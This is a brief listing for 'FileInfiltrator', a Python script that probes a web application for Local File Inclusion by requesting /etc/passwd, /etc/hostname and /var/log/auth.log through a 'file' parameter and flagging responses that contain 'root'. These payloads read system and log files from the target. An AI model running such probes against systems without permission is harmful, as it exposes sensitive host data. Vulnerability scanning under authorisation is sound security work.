Tool Name: FileInfiltrator
Description: A script designed to scan web applications for Local File Inclusion (LFI) vulnerabilities. It helps identify paths that could potentially expose sensitive information on the system.

(Python):

python
Copy
Edit
import requests

def test_lfi(url):
    payloads = ['/etc/passwd', '/etc/hostname', '/var/log/auth.log']
    for payload in payloads:
        response = requests.get(url, params={'file': payload})
        if "root" in response.text:
            print(f"LFI vulnerability detected: {payload}")

if __name__ == "__main__":
    url = input("Enter the web app URL: ")
    test_lfi(url)
